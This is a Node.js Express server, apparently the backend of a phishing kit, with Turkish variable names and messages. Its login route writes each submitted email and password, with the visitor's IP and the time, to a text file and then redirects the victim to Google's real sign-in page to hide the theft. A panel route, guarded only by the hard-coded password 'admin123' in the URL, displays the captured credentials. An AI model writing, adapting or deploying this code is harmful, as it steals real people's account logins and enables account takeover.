const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/giris', (req, res) => {
    const email = req.body.email || 'bos';
    const password = req.body.password || 'bos';
    const ip = req.headers['x-forwarded-for'] || req.ip || 'IP yok';
    const tarih = new Date().toLocaleString('tr-TR');

    const veri = `Email: ${email} | Şifre: ${password} | IP: ${ip} | Tarih: ${tarih}\n`;
    fs.appendFileSync('captured_data.txt', veri, 'utf8');

    res.redirect('https://accounts.google.com/signin');
});

app.get('/panel', (req, res) => {
    const sifre = req.query.sifre;
    if (sifre !== 'admin123') return res.send('Yetkisiz. ?sifre=admin123');
    const data = fs.existsSync('captured_data.txt') ? fs.readFileSync('captured_data.txt', 'utf8') : 'Henüz veri yok.';
    res.send(`<pre style="background:#1e1e2f;color:#fff;padding:20px;font-size:16px;">${data}</pre>`);
});

app.listen(PORT, () => console.log(`Çalışıyor: http://localhost:${PORT}`));
